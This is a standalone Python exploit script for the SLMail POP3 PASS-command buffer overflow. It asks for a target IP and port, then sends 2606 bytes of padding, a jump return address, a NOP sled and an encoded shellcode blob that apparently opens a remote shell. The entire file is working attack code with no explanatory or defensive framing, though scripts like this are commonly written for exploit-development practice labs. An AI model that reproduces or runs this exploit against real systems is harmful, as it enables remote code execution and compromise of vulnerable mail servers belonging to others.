#!/usr/bin/python3

import sys,socket
from time import sleep


print("*************SLMAIL POP3 vulnerability**********")
ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if(len(ip_address)<=0) or (len(port_number)<=0): 
    if(len(ip_address)>0) and (len(port_number)<=0): 
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0): 
        print("IP address field is empty")
    else:
        print("Issues with the user input")
elif(len(ip_address)>0) and (len(port_number)>0): 
    buf =  b""
    buf += b"\xbf\x07\xaa\x1c\x30\xdb\xc6\xd9\x74\x24\xf4\x58"
    buf += b"\x29\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\xc7"
    buf += b"\xae\xfe\xc5\x3b\x46\x7c\x25\xc3\x97\xe1\xaf\x26"
    buf += b"\xa6\x21\xcb\x23\x99\x91\x9f\x61\x16\x59\xcd\x91"
    buf += b"\xad\x2f\xda\x96\x06\x85\x3c\x99\x97\xb6\x7d\xb8"
    buf += b"\x1b\xc5\x51\x1a\x25\x06\xa4\x5b\x62\x7b\x45\x09"
    buf += b"\x3b\xf7\xf8\xbd\x48\x4d\xc1\x36\x02\x43\x41\xab"
    buf += b"\xd3\x62\x60\x7a\x6f\x3d\xa2\x7d\xbc\x35\xeb\x65"
    buf += b"\xa1\x70\xa5\x1e\x11\x0e\x34\xf6\x6b\xef\x9b\x37"
    buf += b"\x44\x02\xe5\x70\x63\xfd\x90\x88\x97\x80\xa2\x4f"
    buf += b"\xe5\x5e\x26\x4b\x4d\x14\x90\xb7\x6f\xf9\x47\x3c"
    buf += b"\x63\xb6\x0c\x1a\x60\x49\xc0\x11\x9c\xc2\xe7\xf5"
    buf += b"\x14\x90\xc3\xd1\x7d\x42\x6d\x40\xd8\x25\x92\x92"
    buf += b"\x83\x9a\x36\xd9\x2e\xce\x4a\x80\x26\x23\x67\x3a"
    buf += b"\xb7\x2b\xf0\x49\x85\xf4\xaa\xc5\xa5\x7d\x75\x12"
    buf += b"\xc9\x57\xc1\x8c\x34\x58\x32\x85\xf2\x0c\x62\xbd"
    buf += b"\xd3\x2c\xe9\x3d\xdb\xf8\xbe\x6d\x73\x53\x7f\xdd"
    buf += b"\x33\x03\x17\x37\xbc\x7c\x07\x38\x16\x15\xa2\xc3"
    buf += b"\xf1\xda\x9b\x13\xc3\xb3\xd9\xa3\xc7\xb1\x57\x45"
    buf += b"\xad\x25\x3e\xde\x5a\xdf\x1b\x94\xfb\x20\xb6\xd1"
    buf += b"\x3c\xaa\x35\x26\xf2\x5b\x33\x34\x63\xac\x0e\x66"
    buf += b"\x22\xb3\xa4\x0e\xa8\x26\x23\xce\xa7\x5a\xfc\x99"
    buf += b"\xe0\xad\xf5\x4f\x1d\x97\xaf\x6d\xdc\x41\x97\x35"
    buf += b"\x3b\xb2\x16\xb4\xce\x8e\x3c\xa6\x16\x0e\x79\x92"
    buf += b"\xc6\x59\xd7\x4c\xa1\x33\x99\x26\x7b\xef\x73\xae"
    buf += b"\xfa\xc3\x43\xa8\x02\x0e\x32\x54\xb2\xe7\x03\x6b"
    buf += b"\x7b\x60\x84\x14\x61\x10\x6b\xcf\x21\x30\x8e\xc5"
    buf += b"\x5f\xd9\x17\x8c\xdd\x84\xa7\x7b\x21\xb1\x2b\x89"
    buf += b"\xda\x46\x33\xf8\xdf\x03\xf3\x11\x92\x1c\x96\x15"
    buf += b"\x01\x1c\xb3"


    size=b"A" * 2606 + b"\x8F\x35\x4A\x5F" + b"\x90" * 16 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send((b"USER TEST \r\n"))
    s.send((b"PASS " + size + b"\r\n"))
    s.close()
